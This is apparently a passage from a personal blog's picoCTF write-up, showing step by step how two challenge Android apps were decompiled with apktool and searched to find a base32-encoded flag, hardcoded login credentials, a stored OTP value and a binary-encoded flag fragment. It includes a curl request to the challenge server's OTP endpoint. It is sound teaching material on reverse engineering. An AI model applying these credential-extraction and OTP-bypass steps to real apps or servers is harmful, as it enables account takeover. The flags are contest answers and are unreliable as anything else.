+smali_classes2/com/example/picoctfimage/R.smali:        Lcom/example/picoctfimage/R$xml;
+smali_classes2/com/example/picoctfimage/R$string.smali:.class public final Lcom/example/picoctfimage/R$string;
+smali_classes2/com/example/picoctfimage/R$string.smali:    value = Lcom/example/picoctfimage/R;
+smali_classes2/com/example/picoctfimage/R$layout.smali:.class public final Lcom/example/picoctfimage/R$layout;
+smali_classes2/com/example/picoctfimage/R$layout.smali:    value = Lcom/example/picoctfimage/R;
+smali_classes2/com/example/picoctfimage/R$mipmap.smali:.class public final Lcom/example/picoctfimage/R$mipmap;
+smali_classes2/com/example/picoctfimage/R$mipmap.smali:    value = Lcom/example/picoctfimage/R;
+smali_classes2/com/example/picoctfimage/R$drawable.smali:.class public final Lcom/example/picoctfimage/R$drawable;
+smali_classes2/com/example/picoctfimage/R$drawable.smali:    value = Lcom/example/picoctfimage/R;
+smali_classes2/com/example/picoctfimage/R$xml.smali:.class public final Lcom/example/picoctfimage/R$xml;
+smali_classes2/com/example/picoctfimage/R$xml.smali:    value = Lcom/example/picoctfimage/R;
+smali_classes2/com/example/picoctfimage/R$style.smali:.class public final Lcom/example/picoctfimage/R$style;
+smali_classes2/com/example/picoctfimage/R$style.smali:    value = Lcom/example/picoctfimage/R;
+smali_classes2/com/example/picoctfimage/R$color.smali:.class public final Lcom/example/picoctfimage/R$color;
+smali_classes2/com/example/picoctfimage/R$color.smali:    value = Lcom/example/picoctfimage/R;
+smali_classes2/com/example/picoctfimage/R$id.smali:.class public final Lcom/example/picoctfimage/R$id;
+smali_classes2/com/example/picoctfimage/R$id.smali:    value = Lcom/example/picoctfimage/R;
+apktool.yml:  renameManifestPackage: com.example.picoctfimage
+AndroidManifest.xml:&lt;manifest android:versionCode="1" android:versionName="1.0" android:compileSdkVersion="34" android:compileSdkVersionCodename="14" package="com.example.picoctfimage" platformBuildVersionCode="34" platformBuildVersionName="14"
+AndroidManifest.xml:    &lt;permission android:name="com.example.picoctfimage.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" android:protectionLevel="signature" /&gt;
+AndroidManifest.xml:    &lt;uses-permission android:name="com.example.picoctfimage.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" /&gt;
+AndroidManifest.xml:        &lt;activity android:name="com.example.picoctfimage.MainActivity" android:exported="true"&gt;
+AndroidManifest.xml:        &lt;provider android:name="androidx.startup.InitializationProvider" android:exported="false" android:authorities="com.example.picoctfimage.androidx-startup"&gt;
+smali_classes3/com/example/picoctfimage/MainActivity$ExternalSyntheticLambda0.smali:.class public final synthetic Lcom/example/picoctfimage/MainActivity$ExternalSyntheticLambda0;
+smali_classes3/com/example/picoctfimage/MainActivity$ExternalSyntheticLambda0.smali:    invoke-static {p1, p2}, Lcom/example/picoctfimage/MainActivity;-&gt;lambda$onCreate$0(Landroid/view/View;Landroidx/core/view/WindowInsetsCompat;)Landroidx/core/view/WindowInsetsCompat;
+smali_classes3/com/example/picoctfimage/MainActivity.smali:.class public Lcom/example/picoctfimage/MainActivity;
+smali_classes3/com/example/picoctfimage/MainActivity.smali:    sget v0, Lcom/example/picoctfimage/R$layout;-&gt;activity_main:I
+smali_classes3/com/example/picoctfimage/MainActivity.smali:    invoke-virtual {p0, v0}, Lcom/example/picoctfimage/MainActivity;-&gt;setContentView(I)V
+smali_classes3/com/example/picoctfimage/MainActivity.smali:    sget v0, Lcom/example/picoctfimage/R$id;-&gt;main:I
+smali_classes3/com/example/picoctfimage/MainActivity.smali:    invoke-virtual {p0, v0}, Lcom/example/picoctfimage/MainActivity;-&gt;findViewById(I)Landroid/view/View;
+smali_classes3/com/example/picoctfimage/MainActivity.smali:    new-instance v1, Lcom/example/picoctfimage/MainActivity$ExternalSyntheticLambda0;
+smali_classes3/com/example/picoctfimage/MainActivity.smali:    invoke-direct {v1}, Lcom/example/picoctfimage/MainActivity$ExternalSyntheticLambda0;-&gt;&lt;init&gt;()V
+smali_classes3/com/example/picoctfimage/MainActivity.smali:    invoke-virtual {p0}, Lcom/example/picoctfimage/MainActivity;-&gt;getSupportActionBar()Landroidx/appcompat/app/ActionBar;
+smali_classes3/com/example/picoctfimage/MainActivity.smali:    invoke-virtual {p0}, Lcom/example/picoctfimage/MainActivity;-&gt;getResources()Landroid/content/res/Resources;
+smali_classes3/com/example/picoctfimage/MainActivity.smali:    sget v3, Lcom/example/picoctfimage/R$color;-&gt;yellow:I
+</code></pre>
+<p>Greping for <code>pico</code> seems to show a high concentration of occurrences in <code>smali_classes3/com/example/picoctfimage/MainActivity.smali</code> and <code>smali_classes2/com/example/picoctfimage</code>. I have no idea what those directories are though. Further, the app seems to be named <code>picoctfimage</code>, so maybe the flag is an image?</p>
+<p>And we have a hit!</p>
+<pre><code>(.venv) zimengx@endeavour ~/S/p/C/M/minions_out&gt; find . -type f -name "*.jpg"
+./res/drawable/minion.jpg
+</code></pre>
+<p><img alt="" src="/media/047b33024795d2f04a3b43cc.jpg"/>
+Running <code>exiftool</code>, we get nothing</p>
+<pre><code>(.venv) zimengx@endeavour ~/S/p/C/M/minions_out&gt; exiftool res/drawable/minion.jpg
+ExifTool Version Number         : 13.36
+File Name                       : minion.jpg
+Directory                       : res/drawable
+File Size                       : 74 kB
+File Modification Date/Time     : 2025:10:10 12:35:15-07:00
+File Access Date/Time           : 2025:10:10 12:35:15-07:00
+File Inode Change Date/Time     : 2025:10:10 12:35:15-07:00
+File Permissions                : -rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : None
+X Resolution                    : 1
+Y Resolution                    : 1
+Image Width                     : 800
+Image Height                    : 711
+Encoding Process                : Progressive DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:2 (2 1)
+Image Size                      : 800x711
+Megapixels                      : 0.569
+</code></pre>
+<p>Maybe its a red herring, lets look in the aforediscovered <code>MainActivity.smali</code></p>
+<pre><code>.class public Lcom/example/picoctfimage/MainActivity;
+.super Landroidx/appcompat/app/AppCompatActivity;
+.source "MainActivity.java"
+
+
+# direct methods
+.method public constructor &lt;init&gt;()V
+    .locals 0
+
+    .line 14
+    invoke-direct {p0}, Landroidx/appcompat/app/AppCompatActivity;-&gt;&lt;init&gt;()V
+
+    return-void
+.end method
+
+.method static synthetic lambda$onCreate$0(Landroid/view/View;Landroidx/core/view/WindowInsetsCompat;)Landroidx/core/view/WindowInsetsCompat;
+    .locals 5
+    .param p0, "v"    # Landroid/view/View;
+    .param p1, "insets"    # Landroidx/core/view/WindowInsetsCompat;
+
+    .line 22
+    invoke-static {}, Landroidx/core/view/WindowInsetsCompat$Type;-&gt;systemBars()I
+
+    move-result v0
+
+    invoke-virtual {p1, v0}, Landroidx/core/view/WindowInsetsCompat;-&gt;getInsets(I)Landroidx/core/graphics/Insets;
+
+    move-result-object v0
+
+    .line 23
+    .local v0, "systemBars":Landroidx/core/graphics/Insets;
+    iget v1, v0, Landroidx/core/graphics/Insets;-&gt;left:I
+
+    iget v2, v0, Landroidx/core/graphics/Insets;-&gt;top:I
+
+    iget v3, v0, Landroidx/core/graphics/Insets;-&gt;right:I
+
+    iget v4, v0, Landroidx/core/graphics/Insets;-&gt;bottom:I
+
+    invoke-virtual {p0, v1, v2, v3, v4}, Landroid/view/View;-&gt;setPadding(IIII)V
+
+    .line 24
+    return-object p1
+.end method
+
+
+# virtual methods
+.method protected onCreate(Landroid/os/Bundle;)V
+    .locals 4
+    .param p1, "savedInstanceState"    # Landroid/os/Bundle;
+
+    .line 18
+    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;-&gt;onCreate(Landroid/os/Bundle;)V
+
+    .line 19
+    invoke-static {p0}, Landroidx/activity/EdgeToEdge;-&gt;enable(Landroidx/activity/ComponentActivity;)V
+
+    .line 20
+    sget v0, Lcom/example/picoctfimage/R$layout;-&gt;activity_main:I
+
+    invoke-virtual {p0, v0}, Lcom/example/picoctfimage/MainActivity;-&gt;setContentView(I)V
+
+    .line 21
+    sget v0, Lcom/example/picoctfimage/R$id;-&gt;main:I
+
+    invoke-virtual {p0, v0}, Lcom/example/picoctfimage/MainActivity;-&gt;findViewById(I)Landroid/view/View;
+
+    move-result-object v0
+
+    new-instance v1, Lcom/example/picoctfimage/MainActivity$ExternalSyntheticLambda0;
+
+    invoke-direct {v1}, Lcom/example/picoctfimage/MainActivity$ExternalSyntheticLambda0;-&gt;&lt;init&gt;()V
+
+    invoke-static {v0, v1}, Landroidx/core/view/ViewCompat;-&gt;setOnApplyWindowInsetsListener(Landroid/view/View;Landroidx/core/view/OnApplyWindowInsetsListener;)V
+
+    .line 26
+    invoke-virtual {p0}, Lcom/example/picoctfimage/MainActivity;-&gt;getSupportActionBar()Landroidx/appcompat/app/ActionBar;
+
+    move-result-object v0
+
+    invoke-static {v0}, Ljava/util/Objects;-&gt;requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;
+
+    move-result-object v0
+
+    check-cast v0, Landroidx/appcompat/app/ActionBar;
+
+    new-instance v1, Landroid/graphics/drawable/ColorDrawable;
+
+    invoke-virtual {p0}, Lcom/example/picoctfimage/MainActivity;-&gt;getResources()Landroid/content/res/Resources;
+
+    move-result-object v2
+
+    sget v3, Lcom/example/picoctfimage/R$color;-&gt;yellow:I
+
+    invoke-virtual {v2, v3}, Landroid/content/res/Resources;-&gt;getColor(I)I
+
+    move-result v2
+
+    invoke-direct {v1, v2}, Landroid/graphics/drawable/ColorDrawable;-&gt;&lt;init&gt;(I)V
+
+    invoke-virtual {v0, v1}, Landroidx/appcompat/app/ActionBar;-&gt;setBackgroundDrawable(Landroid/graphics/drawable/Drawable;)V
+
+    .line 27
+    return-void
+.end method
+
+</code></pre>
+<p>Theres nothing immediately obvious from <code>MainActivity.smali</code>.</p>
+<p>Hmm....</p>
+<p>Searching google for "android apk source file folder", we get some information:</p>
+<p>For an individual Android app project</p>
+<ul>
+<li><strong><code>java</code> or <code>kotlin</code>:</strong> This folder contains your application's source code, organized by package name.</li>
+<li><strong><code>res</code>:</strong> This folder holds all non-code resources, such as images, layouts, and strings.</li>
+<li><strong><code>manifests</code>:</strong> This folder contains the <code>AndroidManifest.xml</code> file, which describes essential information about your app.</li>
+</ul>
+<p>Lets look through <code>res</code> first, as java/kotlin does not exist.
+There are some images in <code>drawable</code> folders and then what appears to be localizations for various languages, lets check out <code>values/</code>, presumably <code>english-US</code> as others are denoted such as <code>english-CA</code> for Canada, and <code>english-AUR</code> for Australia.</p>
+<pre><code>(.venv) zimengx@endeavour ~/S/p/C/M/m/r/values&gt; ls
+attrs.xml  bools.xml  colors.xml  dimens.xml  drawables.xml  ids.xml  integers.xml  plurals.xml  public.xml  strings.xml  styles.xml
+</code></pre>
+<p><code>strings.xml</code> is the most interesting, lets check it out:</p>
+<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+
+&lt;resources&gt;
+
+&lt;string name="Banana"&gt;OBUWG32DKRDHWMLUL53TI43OG5PWQNDSMRPXK3TSGR3DG3BRNY4V65DIGNPW2MDCGFWDGX3DGBSDG7I=&lt;/string&gt;
+
+&lt;string name="abc_action_bar_home_description"&gt;Navigate home&lt;/string&gt;
+
+&lt;string name="abc_action_bar_up_description"&gt;Navigate up&lt;/string&gt;
+
+&lt;string name="abc_action_menu_overflow_description"&gt;More options&lt;/string&gt;
+
+&lt;string name="abc_action_mode_done"&gt;Done&lt;/string&gt;
+
+&lt;string name="abc_activity_chooser_view_see_all"&gt;See all&lt;/string&gt;
+
+&lt;string name="abc_activitychooserview_choose_application"&gt;Choose an app&lt;/string&gt;
+
+&lt;string name="abc_capital_off"&gt;OFF&lt;/string&gt;
+
+&lt;string name="abc_capital_on"&gt;ON&lt;/string&gt;
+
+&lt;string name="abc_menu_alt_shortcut_label"&gt;Alt+&lt;/string&gt;
+
+&lt;string name="abc_menu_ctrl_shortcut_label"&gt;Ctrl+&lt;/string&gt;
+
+&lt;string name="abc_menu_delete_shortcut_label"&gt;delete&lt;/string&gt;
+
+&lt;string name="abc_menu_enter_shortcut_label"&gt;enter&lt;/string&gt;
+
+...
+</code></pre>
+<p>YAYY! We get a <code>Bannana</code> string of value <code>OBUWG32DKRDHWMLUL53TI43OG5PWQNDSMRPXK3TSGR3DG3BRNY4V65DIGNPW2MDCGFWDGX3DGBSDG7I</code>. That seems to be b64 encoded.</p>
+<pre><code>(.venv) zimengx@endeavour ~/S/p/C/M/m/r/values&gt; echo "OBUWG32DKRDHWMLUL53TI43OG5PWQNDSMRPXK3TSGR3DG3BRNY4V65DIGNPW2MDCGFWDGX3DGBSDG7I" | base64 --decode
+8)��/����1�t��pQ5����U}�⏎
+</code></pre>
+<p>Nope...maybe b32?</p>
+<pre><code>(.venv) zimengx@endeavour ~/S/p/C/M/m/r/values&gt; echo "OBUWG32DKRDHWMLUL53TI43OG5PWQNDSMRPXK3TSGR3DG3BRNY4V65DIGNPW2MDCGFWDGX3DGBSDG7I" | base32 --decode
+picoCTF{1t_w4sn7_h4rd_unr4v3l1n9_th3_m0b1l3_c0d3}
+</code></pre>
+<p>Nice! That was complicated...</p>
+<hr/>
+<h2>Pico Bank</h2>
+<p>In a bustling city where innovation meets finance, Pico Bank has emerged as a beacon of cutting-edge security. Promising state-of-the-art protection for your assets, the bank claims its mobile application is impervious to all forms of cyber threats. Pico Bank’s tagline, "Security Beyond the Limits," echoes through its high-tech marketing campaigns, assuring users of their utmost safety.
+As a cybersecurity enthusiast, your mission is to test these bold claims. You’ve been hired by a secretive organization to put Pico Bank’s mobile app through a rigorous security assessment. The flag might be in one or more locations, and additional information reveals that a Pico Bank user’s credentials were leaked in an unusual way. Your task is to crack the username and password based on the following profile information: His name is Alex Johnson with the email <a href="mailto:johnson@picobank.com">johnson@picobank.com</a>, Date of Birth: March 14, 1990, Last Transaction Amount: $345.67, Pet name: tricky, and Favorite Color: Blue.
+To perform this challenge, you can use any Android emulator. Some examples include Genymotion Android Emulator or Android Studio.
+Access the Pico Bank Website Pico Bank Website and download the application.</p>
+<p>With only 120 solves and <strong>FIVE</strong> hints, this problem scares me.</p>
+<p>We start by installing <a href="https://developer.android.com/studio/install#linux">Android Studio</a> and running the app inside the emulator.</p>
+<pre><code>zimengx@endeavour ~/S/p/C/PicoBank&gt; ./android-studio/bin/studio.sh
+</code></pre>
+<p><img alt="" src="/media/8fe620e61e1247800b3e45af.png"/>
+I didn't expect Android AOSP to be this barebones!
+<img alt="" src="/media/d535c2ed475e7c87cb88bc73.png"/>
+We need to login with a username and password. Let's decompile the apk again with apktool.</p>
+<pre><code>(.venv) zimengx@endeavour ~/S/p/C/PicoBank [0|1]&gt; java -jar apktool_2.12.1.jar d pico-bank.apk -o pico-bank-out
+I: Using Apktool 2.12.1 on pico-bank.apk with 8 threads
+I: Baksmaling classes.dex...
+I: Loading resource table...
+I: Baksmaling classes3.dex...
+I: Baksmaling classes2.dex...
+I: Decoding file-resources...
+I: Loading resource table from file: ~/.local/share/apktool/framework/1.apk
+I: Decoding values */* XMLs...
+I: Decoding AndroidManifest.xml with resources...
+I: Copying original files...
+I: Copying unknown files...
+</code></pre>
+<p>To find the username, we can try the given information that it might be <code>johnson</code>.</p>
+<pre><code>(.venv) zimengx@endeavour ~/S/p/C/P/pico-bank-out [0|SIGINT]&gt; grep "johnson" -R .
+./smali_classes3/com/example/picobank/Login$1.smali:    const-string v2, "johnson"
+</code></pre>
+<p>If the username is in this file, conveniently named <code>Login.smali</code>, the password may be too.</p>
+<p>Grepping for <code>const-string v2</code>:</p>
+<pre><code>(.venv) zimengx@endeavour ~/S/p/C/P/pico-bank-out [0|SIGINT]&gt; grep "const-string v2" smali_classes3/com/example/picobank/Login\$1.smali
+    const-string v2, "johnson"
+    const-string v2, "tricky1990"
+</code></pre>
+<p>Looks like the password may be <code>tricky1990</code>!
+<img alt="" src="/media/550480b80f713cfa63108ce3.png"/>
+What?? OTP?!</p>
+<p>The OTP might also be hardcoded into the application, or it could be hit by an API endpoint. Lets try the former first.</p>
+<p>In the same folder as <code>Login$1.smali</code>, we have <code>OTP.smali</code>, <code>OTP$1.smali</code>, and so on. Given the user/pass both used information given about <code>johnson</code>, the OTP is likely connected to his last transaction amount: <code>34567</code>, as it cannot be the text <code>blue</code>.</p>
+<p>Grepping for 3456 in these files, we get:</p>
+<pre><code>(.venv) zimengx@endeavour ~/S/p/C/P/p/s/c/e/picobank&gt; grep -R "3456" .
+(.venv) zimengx@endeavour ~/S/p/C/P/p/s/c/e/picobank [0|1]&gt; grep -R "4567" .
+</code></pre>
+<p>Nope, nothing.</p>
+<p>Let's try grepping for <code>const-string v2</code> in these files.</p>
+<pre><code>(.venv) zimengx@endeavour ~/S/p/C/P/p/s/c/e/picobank [0|1]&gt; grep -R "const-string v2" .
+./OTP$2.smali:    const-string v2, "success"
+./MainActivity.smali:    const-string v2, "Welcome, Johnson"
+./Login$1.smali:    const-string v2, "johnson"
+./Login$1.smali:    const-string v2, "tricky1990"
+./OTP.smali:    const-string v2, "/verify-otp"
+./OTP.smali:    const-string v2, "Invalid OTP"
+./OTP.smali:    const-string v2, "otp"
+</code></pre>
+<p>We get some things! <code>OTP.smali</code> seems to give us a API Endpoint at <code>/verify-otp</code>. <code>OTP$2.smali</code> seems to have a success message. Maybe the OTP is in there?</p>
+<pre><code>    invoke-virtual {p1, v2}, Lorg/json/JSONObject;-&gt;getBoolean(Ljava/lang/String;)Z
+
+    move-result v2
+
+    .line 91
+    .local v2, "success":Z
+</code></pre>
+<p>Not much of use, lets check the <code>Invalid OTP</code> string in <code>OTP.smali</code></p>
+<pre><code>.method private verifyOtp(Ljava/lang/String;)V
+    .locals 10
+    .param p1, "otp"    # Ljava/lang/String;
+
+    .line 67
+    const-string v0, "your server url"
+
+    .line 68
+    .local v0, "severUrl":Ljava/lang/String;
+    new-instance v1, Ljava/lang/StringBuilder;
+
+    invoke-direct {v1}, Ljava/lang/StringBuilder;-&gt;&lt;init&gt;()V
+
+    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;-&gt;append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v1
+
+    const-string v2, "/verify-otp"
+
+    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;-&gt;append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v1
+
+    invoke-virtual {v1}, Ljava/lang/StringBuilder;-&gt;toString()Ljava/lang/String;
+
+    move-result-object v1
+
+</code></pre>
+<p>Before I scrolled down to that section, we find something more interesting! <code>const-string v0, "your server url"</code>. This suggests that <code>/verify-otp</code> is indeed an endpoint. This also points that <code>const-string v0</code> values may also be of use for us.</p>
+<p>But first, the OTP digits:</p>
+<pre><code>sget v0, Lcom/example/picobank/R$id;-&gt;otpDigit1:I
+</code></pre>
+<p>We have a couple lines of these, where it looks like its either</p>
+<ol>
+<li>Creating the display boxes for each digit</li>
+<li>or Validating each digit, not quite sure</li>
+</ol>
+<p>Maybe we're searching in the wrong place?? Lets search everywhere for "OTP".</p>
+<pre><code>(.venv) zimengx@endeavour ~/S/p/C/P/pico-bank-out&gt; grep -R "otp"
+...
+res/values/ids.xml:    &lt;item type="id" name="otpDigit4" /&gt;
+res/values/ids.xml:    &lt;item type="id" name="otpLayout" /&gt;
+res/values/ids.xml:    &lt;item type="id" name="otpTextView" /&gt;
+res/values/strings.xml:    &lt;string name="otp_value"&gt;9673&lt;/string&gt;
+smali_classes3/com/example/picobank/OTP$1.smali:    .local v0, "otp":Ljava/lang/String;
+smali_classes3/com/example/picobank/OTP.smali:.field private otpDigit1:Landroid/widget/EditText;
+smali_classes3/com/example/picobank/OTP.smali:.field private otpDigit2:Landroid/widget/EditText;
+smali_classes3/com/example/picobank/OTP.smali:.field private otpDigit3:Landroid/widget/EditText;
+smali_classes3/com/example/picobank/OTP.smali:.field private otpDigit4:Landroid/widget/EditText;
+smali_classes3/com/example/picobank/OTP.smali:    iget-object v0, p0, Lcom/example/picobank/OTP;-&gt;otpDigit1:Landroid/widget/EditText;
+smali_classes3/com/example/picobank/OTP.smali:    iget-object v0, p0, Lcom/example/picobank/OTP;-&gt;otpDigit2:Landroid/widget/EditText;
+smali_classes3/com/example/picobank/OTP.smali:    iget-object v0, p0, Lcom/example/picobank/OTP;-&gt;otpDigit3:Landroid/widget/EditText;
+smali_classes3/com/example/picobank/OTP.smali:    iget-object v0, p0, Lcom/example/picobank/OTP;-&gt;otpDigit4:Landroid/widget/EditText;
+smali_classes3/com/example/picobank/OTP.smali:    .param p1, "otp"    # Ljava/lang/String;
+smali_classes3/com/example/picobank/OTP.smali:    const-string v2, "/verify-otp"
+smali_classes3/com/example/picobank/OTP.smali:    sget v3, Lcom/example/picobank/R$string;-&gt;otp_value:I
+smali_classes3/com/example/picobank/OTP.smali:    const-string v2, "otp"
+smali_classes3/com/example/picobank/OTP.smali:    sget v0, Lcom/example/picobank/R$layout;-&gt;activity_otp:I
+...
+</code></pre>
+<p>Haha, there we go! <code>name="otp_value"&gt;9673&lt;/string&gt;</code>
+<img alt="" src="/media/c081251da4e74d6964a2215a.png"/>
+We get a hint: "Have you analyzed the server's responses when handling OTP requests"</p>
+<p>We know the endpoint is at <code>/verify-otp</code>, so lets try sending a POST. We assume the payload is just titled "otp".</p>
+<pre><code>(.venv) zimengx@endeavour ~/S/p/C/PicoBank&gt; curl -X POST "http://saffron-estate.picoctf.net:58641/verify-otp" \
+                                                -H "User-Agent: curl/8.4.0" \
+                                                -H "Accept: application/json" \
+                                                -H "Content-Type: application/json" \
+                                                --data '{"otp": "9673"}'
+{"success":true,"message":"OTP verified successfully","flag":"s3cur3d_m0b1l3_l0g1n_1ff8ddb7}","hint":"The other part of the flag is hidden in the app"}⏎
+</code></pre>
+<p>Yayy!!!</p>
+<p>We are told:</p>
+<blockquote>
+<p>The other part of the flag is hidden in the app</p>
+</blockquote>
+<p><img alt="" src="/media/65e367d990c185a1441e023e.png"/>
+Looking at the app, the transactions immediately stand out. They are 7-8 length sequences of 1s and 0s, The front 1 is likely not needed and a red herring as ASCII only makes use of 7 bits (with the first bit indicating UTF8 encoding as was later appended to the ASCII standard, just happened to read about the ASCII &amp; UTF-8 standard a few days ago :)). If we take these strings and decode it, we might get the flag.</p>
+<p>Since we can't highlight and copy the text, copying it down by hand is too slow. Lets try to see if we can find the values in the code.</p>
+<pre><code>(.venv) zimengx@endeavour ~/S/p/C/P/pico-bank-out&gt; grep -R "1110000"
+smali_classes3/com/example/picobank/MainActivity.smali:    const-string v7, "$ 1110000"
+</code></pre>
+<p>We see that the transactions are likely all in <code>const-string v7</code> in <code>MainActivity.smali</code></p>
+<p>Looking at <code>MainActivity.smali</code>, we see that the transactions are in a mix of <code>const-string v6</code> and <code>const-string v7</code>, and some strings are not present because they are redundant/repeated again. For sake of time, I won't try to understand the variable sachems, but this already makes it dramatically easier for us to copy and paste the codes in sequence.</p>
+<pre><code>n = """1110000
+
+1101001
+
+1100011
+
+1101111
+
+1000011
+
+1010100
+
+1000110
+
+1111011
+
+110001
+
+1011111
+
+1101100
+
+110001
+
+110011
+
+1100100
+
+1011111
+
+110100
+
+1100010
+
+110000
+
+1110101
+
+1110100
+
+1011111
+
+1100010
+
+110011
+
+110001
+
+1101110
+
+1100111
+
+1011111
+
+"""
+
+
+
+for i in n.split("\n"):
+
+if len(i) != 8:
+
+i = "0" + i
+
+print(chr(int(i,2)), end="")
+</code></pre>
+<pre><code>(.venv) zimengx@endeavour ~/S/p/C/PicoBank&gt; python3 secondPart.py
+picoCTF{1_l13d_4b0ut_b31ng_⏎
+</code></pre>
+<p>Solved!!</p>
+<h2>Final Rank</h2>
+<p>This places me at #115 on the global leader-board and #99 on the HS/College one. Not sure how its ranked. Likely by time of achieving that score rather than time from first problem solve to last problem. I will keep an eye out for these going forward so I can solve them as soon as they come out next time. Fun experience overall. 10/10 recommend.</p>
+<p><img alt="" src="/media/a318ce315f80f5a821c0e23f.png"/>
+<img alt="" src="/media/a6f029801dd09bae548df120.png"/></p></div><a href="/blog/">← blog</a></article></main>
+</body>
+</html>
